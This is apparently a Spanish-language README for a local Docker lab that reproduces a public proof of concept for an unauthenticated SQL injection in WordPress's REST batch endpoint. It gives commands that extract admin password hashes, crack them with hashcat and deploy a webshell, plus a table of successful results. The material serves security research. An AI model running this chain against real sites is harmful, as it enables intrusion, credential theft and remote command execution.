# wp-lab — Lab local de WordPress vulnerable (wp2shell-poc)

Lab local aislado para reproducir el PoC [wp2shell-poc](https://github.com/Icex0/wp2shell-poc):
SQL injection sin autenticación en el endpoint REST batch de WordPress (`/wp-json/batch/v1`),
causada por confusión de rutas entre un POST anidado a `/wp/v2/posts` y un GET interno a
`/wp/v2/users` (param `author_exclude` sin sanitizar). Afecta WordPress **6.9.0–6.9.4** y
**7.0.0–7.0.1**.

Uso exclusivo para investigación/educativo en entorno local propio, sin exposición a red.

## Estructura

```
wp-lab/
├── wp-lab-69/            # WordPress 6.9.4-php8.2-apache, puerto 8096
│   ├── docker-compose.yml
│   └── .env
└── wp-lab-70/            # WordPress 7.0.1-php8.3-apache, puerto 8097
    ├── docker-compose.yml
    └── .env
```

Cada rama tiene su propia red Docker aislada y se levanta con un nombre de proyecto compose
distinto (`-p wp-lab-69` / `-p wp-lab-70`) para que no compartan nada entre sí.

## Requisitos

- Docker Engine + Docker Compose v2 instalados (`docker compose version` debe andar sin `sudo` si
  tu usuario está en el grupo `docker`).
- Verificar que los tags de imagen existan antes de levantar (a veces el sufijo PHP exacto varía):
  ```bash
  docker pull wordpress:6.9.4-php8.2-apache
  docker pull wordpress:7.0.1-php8.3-apache
  ```

## 1. Levantar los stacks

```bash
docker compose -p wp-lab-69 --env-file wp-lab-69/.env -f wp-lab-69/docker-compose.yml up -d
docker compose -p wp-lab-70 --env-file wp-lab-70/.env -f wp-lab-70/docker-compose.yml up -d
```

Verificar que ambos estén healthy/running:

```bash
docker compose -p wp-lab-69 ps
docker compose -p wp-lab-70 ps
```

## 2. Instalar WordPress

Completar el wizard en:
- `http://127.0.0.1:8096/wp-admin/install.php` (rama 6.9.x)
- `http://127.0.0.1:8097/wp-admin/install.php` (rama 7.0.x)

Site title, usuario admin, password, email dummy (no hay SMTP configurado, no importa el valor).

Confirmar versión instalada y que el endpoint vulnerable esté registrado:

```bash
curl -s http://127.0.0.1:8096/ | grep -o 'content="WordPress[^"]*'
curl -s -X POST http://127.0.0.1:8096/wp-json/batch/v1 -H "Content-Type: application/json" -d '{"requests": []}'
```

(repetir con `8097` para la otra rama). La respuesta al POST debe ser JSON, no 404.

**Importante — permalinks:** un WordPress recién instalado usa por defecto permalinks "Plano", y con
esa config Apache no reescribe `/wp-json/...` a `index.php`, así que el POST de arriba da 404 aunque
la instalación esté bien. Antes de probar el endpoint:

1. Entrar a `http://127.0.0.1:8096/wp-admin/options-permalink.php`
2. Elegir cualquier opción que no sea "Plano" (ej. "Nombre de la entrada") y guardar.
3. Repetir con `8097`.

Alternativa sin tocar permalinks, usando el fallback `?rest_route=` que WordPress siempre soporta:
```bash
curl -s -X POST "http://127.0.0.1:8096/?rest_route=/batch/v1" -H "Content-Type: application/json" -d '{"requests": []}'
```

## 3. Clonar y correr wp2shell-poc

```bash
git clone https://github.com/Icex0/wp2shell-poc.git ../wp2shell-poc
cd ../wp2shell-poc
python3 -m venv .venv
source .venv/bin/activate
```

El proyecto no tiene dependencias de terceros (solo usa la stdlib de Python), así que no hace falta
`pip install -r requirements.txt` (ese archivo no existe en el repo). Alcanza con correr el script
directamente con el `.venv` activado:

```bash
python wp2shell.py --help
```

La URL del target es un argumento **posicional**, no un flag (`-u` no existe). Como la instalación
queda con permalinks "Plano" por defecto (ver paso 2), hay que pasar **`--rest-route`** para que el
script use `/?rest_route=/batch/v1` en vez de `/wp-json/batch/v1` (que 404 sin pretty permalinks):

```bash
python wp2shell.py check --rest-route http://127.0.0.1:8096
python wp2shell.py check --rest-route http://127.0.0.1:8097
```

Si en el paso 2 activaste pretty permalinks (opción "Nombre de la entrada" en vez de "Plano"),
`--rest-route` no es necesario y podés usar `/wp-json/batch/v1` directo.

Uso real de cada subcomando (confirmado en `wp2shell/cli.py`):

```bash
# check — confirma la vulnerabilidad
python wp2shell.py check <url> [--rest-route] [--timeout 30] [--proxy ...] [--sleep 3] [--samples 3] [--confirm-sqli]

# read — extrae datos vía blind SQLi (también acepta --rest-route si no hay pretty permalinks)
python wp2shell.py read --rest-route <url> --preset users        # o --preset fingerprint (default)
python wp2shell.py read --rest-route <url> --query "<expresión SQL escalar>" [--prefix wp_] [--max-length 128]

# shell — despliega webshell (requiere credenciales admin ya obtenidas)
python wp2shell.py shell <url> --user <usuario> --password <password> --cmd "<comando>"
python wp2shell.py shell <url> --user <usuario> --password <password> -i   # modo interactivo
# --keep conserva el webshell subido; --cleanup lo borra al salir (mutuamente excluyentes)
```

Empezar siempre con `python wp2shell.py --help` y `python wp2shell.py <subcomando> --help` para
confirmar contra la versión real clonada, por si el repo cambió los flags.

## 4. Snapshot opcional

Para no rehacer el wizard en cada corrida, guardar un snapshot limpio antes de explotar:

```bash
docker commit wp-lab-69-wordpress-1 wp-lab:clean-69
docker commit wp-lab-70-wordpress-1 wp-lab:clean-70
```

(el nombre real del contenedor puede variar; confirmar con `docker ps` si no coincide).

## 5. Destruir el lab al terminar

```bash
docker compose -p wp-lab-69 -f wp-lab-69/docker-compose.yml down -v
docker compose -p wp-lab-70 -f wp-lab-70/docker-compose.yml down -v
```

`-v` borra los volúmenes (`db_data`, `wp_data`), eliminando cualquier webshell o backdoor que haya
dejado el PoC. Verificar con `docker volume ls` que no quedaron `wp-lab-69_*` / `wp-lab-70_*`.

## Troubleshooting (problemas reales encontrados al armar este lab)

**"Connection refused" al pegarle al puerto, con `PORTS` vacío en `docker compose ps`.**
Causa: se puso `internal: true` en la red del compose para "sellar" la salida a internet.
Docker no puede publicar puertos al host en una red sin gateway, así que el bind a `127.0.0.1`
deja de aplicarse. Fix: dejar siempre `internal: false` (ver Notas de seguridad más abajo para
cómo aislar la salida a internet sin romper el port-forward).

**Error "Error establishing a database connection" / `getaddrinfo for db failed: Name or service
not known` al abrir el sitio o al correr el batch probe.**
Causa: se editó la red del compose (ida y vuelta a `internal: true`/`false`, o cualquier cambio de
red) sin recrear los contenedores del todo — quedan pegados a una versión vieja de la red y pierden
la resolución DNS interna hacia el servicio `db`. Fix: recrear el stack completo (sin perder datos,
`down` sin `-v`):
```bash
docker compose -p wp-lab-69 -f wp-lab-69/docker-compose.yml down
docker compose -p wp-lab-69 --env-file wp-lab-69/.env -f wp-lab-69/docker-compose.yml up -d
docker compose -p wp-lab-69 ps   # confirmar PORTS = 127.0.0.1:8096->80/tcp en wordpress-1
```

**`POST /wp-json/batch/v1` da 404 aunque la instalación esté bien.**
Ver la nota de permalinks en el paso 2 — usar `?rest_route=/batch/v1` (o el flag `--rest-route`
del PoC) en vez de activar pretty permalinks, si preferís no tocar la config del sitio.

**`wp2shell: error: unrecognized arguments: -u`.**
La URL del target es un argumento **posicional** en `wp2shell.py`, no un flag `-u`/`--url`. Ver la
sintaxis real de cada subcomando más abajo (confirmada leyendo `wp2shell/cli.py`).

**`pip install -r requirements.txt` → `No such file or directory`.**
El repo no tiene ese archivo — el PoC no usa dependencias de terceros, solo la stdlib de Python.
Alcanza con activar el venv y correr `python wp2shell.py` directo.

**`check` da `HTTP 500` en vez de `207` al usar `--confirm-sqli` o el probe completo.**
Si el body es `{"requests": []}` (vacío) y da 207, pero el probe real de `check` (con las 4
sub-requests que arma `marker_probe()`) da 500 con `"Error establishing a database connection"`
en el JSON de respuesta — es el mismo bug de DNS de `db` de arriba, no un problema del PoC ni de la
versión de WordPress. Recrear el stack lo soluciona.

**Cracking del hash de usuario (`$wp$2y$10$...`) falla con `hashcat -m 400` / `john
--format=phpass` → "Token length exception" / "No password hashes loaded".**
Desde WordPress 6.8, el core usa bcrypt nativo de PHP (`password_hash()`) envuelto con el prefijo
`$wp$`, no el `phpass` clásico (`$P$`/`$H$`, modo 400). Para crackearlo hay que convertirlo a un
bcrypt válido de 60 caracteres reemplazando `$wp$` por un solo `$` (**no** borrar los 4 caracteres
enteros — eso deja el hash en 59 caracteres y hashcat tira "Token length exception"):
```bash
echo '$wp$2y$10$<resto-del-hash>' | sed 's/^\$wp\$/\$/' > hash_bcrypt.txt
hashcat -m 3200 hash_bcrypt.txt /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
`hashcat ... --show` **no ejecuta** el cracking, solo lista hashes ya resueltos en el potfile —
correr primero sin `--show` para que intente de verdad.

## Notas de seguridad

- Los contenedores WordPress bindean solo a `127.0.0.1`, nunca a `0.0.0.0` — nada fuera de esta
  máquina puede alcanzarlos.
- El servicio `db` no expone puertos al host.
- No reutilizar estas instancias para nada real ni credenciales que uses en otro lado.
- Si el firewall local (`ufw`/`iptables`) tiene reglas permisivas hacia Docker, confirmar que no
  hay forwarding accidental que exponga los puertos fuera del loopback.
- **No poner `internal: true` en la red** para "sellar" la salida a internet: Docker no puede
  publicar puertos al host en una red sin gateway, así que el bind a `127.0.0.1` deja de funcionar
  y el PoC no puede alcanzar el sitio (se ve como "Connection refused" con `PORTS` vacío en
  `docker compose ps`). Si en algún momento necesitás bloquear la salida a internet del contenedor
  (por si el PoC logra RCE), hacelo con una regla `iptables`/`ufw` de egreso apuntada a la IP del
  contenedor en el host, no tocando la config de la red en compose.

## Resultados verificados en este lab

Cadena completa reproducida de punta a punta en ambas ramas afectadas:

| Paso | 6.9.4 (puerto 8096) | 7.0.1 (puerto 8097) |
|---|---|---|
| `check --rest-route` | VULNERABLE (route-confusion detectado) | VULNERABLE (route-confusion detectado) |
| `check --rest-route --confirm-sqli` | timing confirmado (baseline ~0.04s, inyectado ~3.05s) | timing confirmado (baseline ~0.05s, inyectado ~3.05s) |
| `read --preset users` | 1 usuario (`admin`) + hash `$wp$2y$...` extraído | 1 usuario (`admin2`) + hash `$wp$2y$...` extraído |
| Cracking del hash | bcrypt modo 3200 tras fix de prefijo `$wp$` | ídem |
| `shell --user ... --password ... --cmd id` | `uid=33(www-data) gid=33(www-data)` | `uid=33(www-data) gid=33(www-data)` |

Markers de batch probe consistentes en ambas versiones: `parse_path_failed`, `block_cannot_read`,
`rest_batch_not_allowed`.
